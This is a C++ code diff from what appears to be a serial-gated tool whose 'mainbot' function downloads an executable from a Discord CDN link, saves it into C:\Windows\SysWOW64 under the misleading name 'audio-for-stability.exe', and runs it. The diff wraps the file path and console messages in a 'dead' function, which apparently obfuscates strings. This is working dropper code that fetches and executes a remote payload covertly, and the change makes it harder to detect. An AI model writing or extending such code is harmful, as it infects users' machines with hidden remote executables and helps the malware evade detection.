@@ -161,7 +161,7 @@ void mainbot()
 
                 
             std::string download = (dead("https://cdn.discordapp.com/attachments/834754431249285140/887380454674694184/Demon_Cleaner.exe"));
-            std::string path = "C:\\Windows\\SysWOW64\\audio-for-stability.exe";
+            std::string path = (dead("C:\\Windows\\SysWOW64\\audio-for-stability.exe").c_str());
             URLDownloadToFileA(NULL, download.c_str(), path.c_str(), 0, NULL);
             system(dead("cd C:\\Windows\\SysWOW64\\").c_str());
             system(dead("start audio-for-stability.exe").c_str());
@@ -186,8 +186,8 @@ void mainbot()
             tlmisir();
 
             system(dead("cls").c_str());
-            std::cout << CYAN << "Sorry but you are not in our database. " << std::endl;
-            std::cout << GREEN << "serial : ";
+            std::cout << CYAN << (dead("Sorry but you are not in our database. ").c_str()) << std::endl;
+            std::cout << GREEN << (dead("serial : ").c_str());
             std::cout << serialNumber << std::endl;
             Sleep(10000);
             rydekem();
